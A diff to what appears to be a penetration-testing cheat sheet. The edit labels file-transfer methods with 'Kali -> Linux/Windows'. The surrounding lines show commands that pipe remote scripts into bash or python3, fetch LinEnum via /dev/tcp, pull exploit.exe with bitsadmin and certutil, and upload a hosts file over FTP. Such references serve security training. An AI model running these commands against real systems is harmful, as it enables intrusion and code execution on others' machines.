@@ -1027,21 +1027,21 @@ ftp> PUT c:\windows\system32\drivers\etc\hosts
 ftp> bye
 ```
 
-- Wget
+- Wget (Kali -> Linux)
 
 ```
 $ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
 $ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
 ```
 
-- Curl
+- Curl (Kali -> Linux)
 
 ```
 $ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh
 $ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 ```
 
-- Bash (/dev/tcp)
+- Bash (/dev/tcp) (Kali -> Linux)
 
 ```
 $ exec 3<>/dev/tcp/10.10.10.32/80
@@ -1049,13 +1049,13 @@ $ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 $ cat <&3
 ```
 
-- Bitsadmin
+- Bitsadmin (Kali -> Windows)
 
 ```
 C:\> bitsadmin /transfer n http://<IP address>/exploit.exe C:\Temp\exploit.exe
 ```
 
-- Certutil
+- Certutil (Kali -> Windows)
 
 ```
 C:\> certutil.exe -verifyctl -split -f http://<IP address>/exploit.exe
